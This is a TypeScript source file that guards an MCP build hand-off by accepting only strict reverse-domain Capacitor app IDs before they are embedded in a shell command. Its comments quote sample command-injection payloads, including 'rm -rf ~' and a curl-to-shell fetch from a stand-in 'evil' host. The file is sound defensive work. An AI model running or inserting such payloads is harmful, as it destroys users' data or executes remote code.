// src/build/onboarding/mcp/app-id-validation.ts
//
// Command-injection guard for the MCP build hand-off.
//
// The build command embeds the capacitor.config appId directly in a shell
// command string that the MCP spawns as a background build process, and that
// is also shown to an agent to run in its shell.  An attacker who controls the
// appId (e.g.
// a malicious capacitor.config) could inject arbitrary shell code:
//   com.x; rm -rf ~
//   com.x$(curl evil|sh)
//
// This validator accepts only strict reverse-domain package identifiers:
//   two or more labels separated by REAL dots, each label starting with an
//   alphanumeric and containing only [A-Za-z0-9_-] — e.g. com.example.app,
//   io.capgo.app_1, com.acme.my-app.
//
// The pattern rejects every shell metacharacter:
//   space, ; $ ` ( ) & | > < # / ' " \ newline tab
// and also rejects names without a dot (`nodots`, `com-example`, `foo_bar`)
// and labels that start with `-` (which a shell could parse as a flag).
//
// The regex is intentionally stricter than the init/command.ts appIdRegex so
// that it stays safe even if that regex is relaxed in the future.  Do NOT
// weaken this validator.

/** Strict reverse-domain package identifier pattern (command-injection safe). */
const SAFE_APP_ID = /^[a-z0-9][\w-]*(?:\.[a-z0-9][\w-]*)+$/i

/**
 * Returns true only when `appId` is a safe reverse-domain package identifier
 * that can be embedded in a shell command string without risk of injection.
 *
 * Valid examples:   com.example.app   io.capgo.app_1   com.acme.my-app
 * Invalid examples: com.x; rm -rf ~   com.x$(cmd)   nodots   com-example   foo_bar   ""
 */
export function isSafeAppIdForCommand(appId: string): boolean {
  return SAFE_APP_ID.test(appId) && appId.includes('.')
}
